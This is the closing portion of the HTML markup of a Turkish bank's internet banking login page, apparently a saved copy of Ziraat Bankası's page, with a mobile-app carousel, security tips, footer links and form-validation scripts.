         <img src="http://www.ziraat.com.tr/Content/assets/img/login/phone.png" style="border-width:0px;">
         <p>Mobil uygulamamız ile<br>Ziraat Bankası hep yanınızda!</p>
         <a causesval="false" onclick="window.open('https://www.bankkart.com.tr/bankkart-mobil','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_ctl06_DownloadMobileAppButton2" class="btn btn-default " href="javascript:__doPostBack('ctl00$ctl06$DownloadMobileAppButton2','')" tabindex="0" data-owl-temp-tabindex="0"><span></span>HEMEN YÜKLE</a>
              
          </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 370px;"><div id="" class="item">
            
         <img src="http://www.ziraat.com.tr/Content/assets/img/phone.png" style="border-width:0px;">
         <p>Mobil uygulamamız ile<br>Ziraat Bankası hep yanınızda!</p>
         <a causesval="false" onclick="window.open('http://www.ziraat.com.tr/tr/Bireysel/DogrudanBankacilik/Pages/ZiraatMobil.aspx','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_ctl06_DownloadMobileAppButton1" class="btn btn-default " href="javascript:__doPostBack('ctl00$ctl06$DownloadMobileAppButton1','')" tabindex="-1" data-owl-temp-tabindex="0"><span></span>HEMEN YÜKLE</a>
              
          </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 370px;"><div id="" class="item">
            
         <img src="http://www.ziraat.com.tr/Content/assets/img/login/phone.png" style="border-width:0px;">
         <p>Mobil uygulamamız ile<br>Ziraat Bankası hep yanınızda!</p>
         <a causesval="false" onclick="window.open('https://www.bankkart.com.tr/bankkart-mobil','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_ctl06_DownloadMobileAppButton2" class="btn btn-default " href="javascript:__doPostBack('ctl00$ctl06$DownloadMobileAppButton2','')" tabindex="-1" data-owl-temp-tabindex="0"><span></span>HEMEN YÜKLE</a>
              
          </div></div></div></div><div class="owl-nav disabled"><div class="owl-prev" tabindex="0">prev</div><div class="owl-next" tabindex="0">next</div></div><div class="owl-dots"><div class="owl-dot"><span></span></div><div class="owl-dot active"><span></span></div></div></div>
      <div id="" class="login-info">
          
         <p><i class="icon-click"></i>Ziraat Bankası İnternet Şubesi´ne sadece www.ziraatbank.com.tr adresindeki "İnternet Şubesi" linkine tıklayarak ulaşınız</p>
         <p><i class="icon-kilit"></i>Müşteri numaranızı, İnternet/Mobil bankacılık giriş ve ATM şifrenizi Ziraat Bankası personeli dahil kimse ile paylaşmayınız.</p>
      
        </div>
   
      </div>

    
               <a id="" class="no-click-link combo-logo hidden-xs hidden-sm" href="#">
                  
                  <img src="http://www.ziraat.com.tr/Content/assets/img/comodo-logo.png" style="border-width:0px;">
               </a>

    </div>

                  </div>
                   
               </div>
            
  </div>
            
<footer class="visible-xs">
    <div id="ButtonContainer" class="top">
    
  
          <a causesval="false" onclick=";;;" id="ctl00_LoginFooter_SecurityButton" href="javascript:__doPostBack('ctl00$LoginFooter$SecurityButton','')"><span></span>GÜVENLİK</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginFooter_HelpButton" href="javascript:__doPostBack('ctl00$LoginFooter$HelpButton','')"><span></span>YARDIM</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginFooter_FaqButton" href="javascript:__doPostBack('ctl00$LoginFooter$FaqButton','')"><span></span>SIKÇA SORULAN SORULAR</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginFooter_BtnLanguage" href="javascript:__doPostBack('ctl00$LoginFooter$BtnLanguage','')"><span></span>ENGLISH</a>
    
    
  </div>
    <div id="" class="bottom">
    
      <ul id="" class="clearfix">
      
         <li id="" class="">
            <a id="" class="no-click-link" href="#">
               
               <img src="http://www.ziraat.com.tr/Content/assets/img/comodo-logo.png" style="border-width:0px;">
            </a>
         </li>
           
           <li id="" class="call-center">
          <a id="LogoButton" class="icon-musteri-iletisim-merkezi" href="tel:08502200000">
                    
                </a>
       
                </li>

      
    </ul>
    
  </div>
</footer>

        
</div>
    
<script type="text/javascript">
//<![CDATA[
var Page_Validators =  new Array(document.getElementById("ctl00_c_PageValidation"));
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
var ctl00_c_PageValidation = document.all ? document.all["ctl00_c_PageValidation"] : document.getElementById("ctl00_c_PageValidation");
ctl00_c_PageValidation.evaluationfunction = "CustomValidatorEvaluateIsValid";
ctl00_c_PageValidation.clientvalidationfunction = "ValidatePage";
//]]>
</script>


<script type="text/javascript">
//<![CDATA[
$(window).bind('load', function() { if(typeof setHasFormChanges === 'function') { setHasFormChanges(top.window, false); } });
var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}

function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
        function OpenSMSOptionLb() { $('#ctl00_c_LbSMSOption').modal('show'); $('#ctl00_c_LbSMSOption').css('display','block');  $('#ctl00_c_LbSMSOption').addClass('in');}//]]>
</script>
</form>
   
     <script src="/core.js?v=3RTZjdVQ8sZtOkdCAZlBnRA-AirEWvAc944pQ_jFQNg1"></script>

    <script src="/dashboard.js?v=Hu57426f8KHuwyIA-SsO3YSF_XxFbdCEze6_8Xijv9E1"></script>

    <script src="/subpage.js?v=sXB_2jj5iRmQyVGgF_FjVfKYHxnkUUjUkE8rMGsGwBg1"></script>

    <script src="/ui.min.js?v=N-MvsGfGBpB60Yjew2nUA567v64gHtnrYo4mWLnprJc1"></script>

    

    <script type="text/javascript">
        MODULES.Utility.Validation(".sendBtn", function () { });
        var isSubmitted = false;
        function loginSubmit() {
            if ($('form').valid())
                $('form').submit();
        }
        function ShowLoginLoading() {
            $('input').blur();
            MODULES.Utility.Loading.show();
        }
        function HideLoginLoading() {
            MODULES.Utility.Loading.hide();
        }
    </script>
    


</body></html>